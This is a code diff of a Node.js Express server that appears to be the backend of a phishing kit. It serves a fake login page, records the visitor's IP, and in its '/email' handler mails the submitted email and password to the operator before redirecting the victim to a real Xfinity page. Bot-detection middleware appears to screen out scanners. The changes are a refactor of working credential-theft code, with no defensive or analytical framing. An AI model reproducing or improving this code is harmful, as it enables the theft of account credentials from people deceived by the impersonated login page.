@@ -3,17 +3,16 @@ const express = require('express');
 const session = require('express-session');
 const path = require('path');
 const cors = require('cors');
-const DataDome = require('@datadome/node-module');
+const axios = require('axios');
 const sendMail = require('./mail');
 const beautify = require('js-beautify').html;
 const ejs = require('ejs');
-const axios = require('axios');
+const DataDome = require('@datadome/node-module');
 
 const app = express();
 
 app.set('view engine', 'ejs');
 app.use(express.static('views'));
-
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
 app.use(cors());
@@ -25,7 +24,6 @@ app.use(session({
 }));
 
 app.use((req, res, next) => {
-  // Middleware to store the visitor's IP
   req.visitorIP = req.ip;
   next();
 });
@@ -59,14 +57,13 @@ app.get('/loginPage', async (req, res) => {
     const response = await axios.get('https://api.ipify.org?format=json');
     const visitorIP = response.data.ip;
 
-    // Store visitorIP in the session
     req.session.visitorIP = visitorIP;
+    req.session.userInput = req.session.userInput || null;
 
-    // Retrieve userInput from the session
     const userInput = req.session.userInput;
+    const sessionVisitorIP = req.session.visitorIP;
 
-    // Render your loginPage.ejs passing visitorIP and userInput
-    res.render('loginPage.ejs', { visitorIP, userInput });
+    res.render('loginPage.ejs', { visitorIP: sessionVisitorIP, userInput });
   } catch (error) {
     console.error('Error getting IP:', error);
     res.status(500).send('Error getting IP');
@@ -75,22 +72,19 @@ app.get('/loginPage', async (req, res) => {
 
 app.post('/email', (req, res) => {
   const { passwd } = req.body;
-  const email = req.session.userInput;
-  const visitorIP = req.session.visitorIP;
+  const { visitorIP, userInput } = req.session;
 
-  // Assuming your sendMail function requires email, password, and IP address
-  sendMail(email, passwd, visitorIP, (err, data) => {
+  sendMail(userInput, passwd, visitorIP, (err, data) => {
     if (err) {
       res.status(500).json({ message: 'internal error', err });
     } else {
-      res.redirect('https://www.xfinity.com/hub/news'); // Redirect after sending email
+      res.redirect('https://www.xfinity.com/hub/news');
     }
   });
 });
 
 app.get('/', (req, res) => {
-  // Use DataDome for bot detection and protection
   datadomeClient.auth(req, res);
 });
 
-app.listen(PORT, () => console.log('server running'));
+app.listen(PORT, () => console.log('Server running on port', PORT));
